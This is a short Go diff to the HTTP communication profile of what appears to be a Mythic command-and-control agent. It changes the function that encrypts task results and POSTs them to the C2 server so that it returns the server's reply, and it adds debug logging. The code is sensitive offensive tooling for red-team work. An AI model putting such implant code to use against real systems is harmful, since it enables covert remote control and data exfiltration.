@@ -387,7 +387,7 @@ func (h *HTTPProfile) getActiveUUID(agent *structs.Agent) string {
 }
 
 // PostResponse sends a response back to Mythic
-func (h *HTTPProfile) PostResponse(response structs.Response, agent *structs.Agent) error {
+func (h *HTTPProfile) PostResponse(response structs.Response, agent *structs.Agent) ([]byte, error) {
 	responseMsg := structs.PostResponseMessage{
 		Action:    "post_response",
 		Responses: []structs.Response{response},
@@ -395,7 +395,7 @@ func (h *HTTPProfile) PostResponse(response structs.Response, agent *structs.Age
 
 	body, err := json.Marshal(responseMsg)
 	if err != nil {
-		return fmt.Errorf("failed to marshal response message: %w", err)
+		return nil, fmt.Errorf("failed to marshal response message: %w", err)
 	}
 
 	// Encrypt if encryption key is provided
@@ -412,20 +412,23 @@ func (h *HTTPProfile) PostResponse(response structs.Response, agent *structs.Age
 
 	resp, err := h.makeRequest("POST", h.PostEndpoint, []byte(encodedData))
 	if err != nil {
-		return fmt.Errorf("post response request failed: %w", err)
+		return nil, fmt.Errorf("post response request failed: %w", err)
 	}
 	defer resp.Body.Close()
 
+	// Read response body
+	respBody, _ := io.ReadAll(resp.Body)
+	
 	if resp.StatusCode != http.StatusOK {
-		return fmt.Errorf("post response failed with status: %d", resp.StatusCode)
+		log.Printf("[DEBUG] Post response failed with status: %d, body: %s", resp.StatusCode, string(respBody))
+		return nil, fmt.Errorf("post response failed with status: %d", resp.StatusCode)
 	}
 
 	if h.Debug {
-		_, _ = io.ReadAll(resp.Body) // respBody for potential debug use
-		// log.Printf("[DEBUG] Post response result: %s", string(respBody))
+		log.Printf("[DEBUG] Post response result: %s", string(respBody))
 	}
 
-	return nil
+	return respBody, nil
 }
 
 // makeRequest is a helper function to make HTTP requests
